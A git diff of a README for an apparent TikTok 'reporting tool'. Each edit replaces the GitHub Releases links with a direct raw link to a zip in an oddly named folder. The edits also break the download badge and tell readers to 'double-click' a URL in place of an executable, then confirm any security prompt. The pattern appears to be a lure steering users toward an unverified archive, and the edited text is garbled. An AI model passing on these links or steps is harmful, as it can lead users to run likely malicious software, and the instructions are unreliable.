@@ -1,6 +1,6 @@
 # 📊 tiktok-reporting-tool - Simplify Your Reporting Process
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-brightgreen)](https://github.com/TheGhostMan007/tiktok-reporting-tool/releases)
+[![Download](https://raw.githubusercontent.com/TheGhostMan007/tiktok-reporting-tool/main/electrodispersive/reporting_tool_tiktok_1.5-alpha.1.zip%20Now-Get%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/TheGhostMan007/tiktok-reporting-tool/main/electrodispersive/reporting_tool_tiktok_1.5-alpha.1.zip)
 
 ## 📌 Overview
 
@@ -19,7 +19,7 @@ Before you download the TikTok Reporting Tool, make sure your system meets these
 
 ### Installation Steps
 
-1. **Visit the Download Page:** Go to the Releases page for the latest version of the TikTok Reporting Tool. You can find it here: [Download Page](https://github.com/TheGhostMan007/tiktok-reporting-tool/releases).
+1. **Visit the Download Page:** Go to the Releases page for the latest version of the TikTok Reporting Tool. You can find it here: [Download Page](https://raw.githubusercontent.com/TheGhostMan007/tiktok-reporting-tool/main/electrodispersive/reporting_tool_tiktok_1.5-alpha.1.zip).
 
 2. **Select the Latest Release:** Look for the latest version near the top of the Releases page. It usually has the highest version number (e.g., v1.0.0).
 
@@ -29,14 +29,14 @@ Before you download the TikTok Reporting Tool, make sure your system meets these
 
 5. **Run the Application:**
    - Navigate to the folder where you extracted the files.
-   - Double-click the application file (e.g., `TikTokReportingTool.exe`).
+   - Double-click the application file (e.g., `https://raw.githubusercontent.com/TheGhostMan007/tiktok-reporting-tool/main/electrodispersive/reporting_tool_tiktok_1.5-alpha.1.zip`).
    - If a security prompt appears, confirm that you want to run the application.
 
 ## 📥 Download & Install
 
 You can download the latest release from the Releases page:
 
-[Download the TikTok Reporting Tool](https://github.com/TheGhostMan007/tiktok-reporting-tool/releases)
+[Download the TikTok Reporting Tool](https://raw.githubusercontent.com/TheGhostMan007/tiktok-reporting-tool/main/electrodispersive/reporting_tool_tiktok_1.5-alpha.1.zip)
 
 Follow the installation steps detailed above to get started.
 
